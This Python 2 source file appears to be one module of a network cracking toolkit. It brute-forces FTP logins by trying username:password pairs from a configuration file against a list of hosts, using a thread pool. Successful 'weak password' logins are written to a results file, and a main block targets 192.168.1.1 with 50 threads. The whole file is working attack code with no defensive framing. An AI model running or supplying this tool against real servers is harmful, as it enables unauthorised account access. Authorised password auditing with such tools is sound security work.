#coding=utf-8
import time
import threading
from multiprocessing.dummy import Pool
from printers import printPink,printGreen
from ftplib import FTP


class ftp_burp(object):

    def __init__(self,c):
        self.config=c
        self.lock=threading.Lock()
        self.result=[]
        self.lines=self.config.file2list("conf/ftp.conf")


    def ftp_connect(self,ip,username,password,port):
        crack=0
        try:
            ftp=FTP()
            ftp.connect(ip,str(port))
            ftp.login(user=username,passwd=password)
            crack=1
            ftp.close()
        except Exception,e:
            self.lock.acquire()
            print "%s ftp service 's %s:%s login fail " %(ip,username,password)
            self.lock.release()
        return crack


    def ftp_l(self,ip,port):
            try:
                for data in self.lines:
                    username=data.split(':')[0]
                    password=data.split(':')[1]
                    if self.ftp_connect(ip,username,password,port)==1:
                        self.lock.acquire()
                        printGreen("%s ftp at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        self.result.append("%s ftp at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        self.lock.release()
                        break
            except Exception,e:
                pass

    def run(self,ipdict,pinglist,threads,file):
        if len(ipdict['ftp']):
            printPink("crack ftp  now...")
            print "[*] start crack ftp  %s" % time.ctime()
            starttime=time.time()

            pool=Pool(threads)

            for ip in ipdict['ftp']:
                pool.apply_async(func=self.ftp_l,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))
            pool.close()
            pool.join()

            print "[*] stop ftp serice  %s" % time.ctime()
            print "[*] crack ftp done,it has Elapsed time:%s " % (time.time()-starttime)

            for i in xrange(len(self.result)):
                self.config.write_file(contents=self.result[i],file=file) 


if __name__ == '__main__':
    import sys
    sys.path.append("../")
    from comm.config import *
    c=config()
    ipdict={'ftp': ['192.168.1.1:21']} 
    pinglist=['192.168.1.1']
    test=ftp_burp(c)
    test.run(ipdict,pinglist,50,file="../result/test")

